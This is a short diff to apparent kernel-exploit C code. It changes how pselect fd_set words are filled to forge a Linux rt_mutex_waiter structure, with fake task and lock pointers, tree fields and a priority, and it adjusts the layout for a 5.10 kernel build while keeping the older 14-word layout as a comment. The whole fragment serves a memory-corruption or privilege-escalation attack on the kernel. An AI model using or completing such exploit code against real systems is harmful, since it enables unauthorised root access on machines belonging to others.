@@ -99,25 +99,44 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
+  // 5.10 nothing/pong: 10 words, no debug fields
+  // rt_mutex_waiter = {rb_node tree_entry, rb_node pi_tree_entry, task*, lock*, int prio, u64 deadline}
   struct pselect_waiter_word {
     int word;
     uint64_t value;
     const char *name;
   } words[] = {
-    {2, 0, "tree_pc"},
-    {3, 0, "tree_right"},
-    {4, 0, "tree_left"},
-    {5, 1, "tree_prio"},
-    {6, 0, "tree_deadline"},
-    {7, 0, "pi_parent"},
-    {8, 0, "pi_right"},
-    {9, 0, "pi_left"},
-    {10, 1, "pi_prio"},
-    {11, 0, "pi_deadline"},
-    {12, fake_task, "task"},
-    {13, fake_lock, "lock"},
-    {14, 3, "wake_state"},
+    {0, 0, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, 0, "tree_left"},
+    {3, 0, "pi_pc"},
+    {4, 0, "pi_right"},
+    {5, 0, "pi_left"},
+    {6, fake_task, "task"},
+    {7, fake_lock, "lock"},
+    {8, 1, "prio"},
+    {9, 0, "deadline"},
   };
+  // Original 14 word
+  // struct pselect_waiter_word {
+  //   int word;
+  //   uint64_t value;
+  //   const char *name;
+  // } words[] = {
+  //   {2, 0, "tree_pc"},
+  //   {3, 0, "tree_right"},
+  //   {4, 0, "tree_left"},
+  //   {5, 1, "tree_prio"},
+  //   {6, 0, "tree_deadline"},
+  //   {7, 0, "pi_parent"},
+  //   {8, 0, "pi_right"},
+  //   {9, 0, "pi_left"},
+  //   {10, 1, "pi_prio"},
+  //   {11, 0, "pi_deadline"},
+  //   {12, fake_task, "task"},
+  //   {13, fake_lock, "lock"},
+  //   {14, 3, "wake_state"},
+  // };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct pselect_waiter_word *w = &words[i];
     pselect_put_waiter_word(
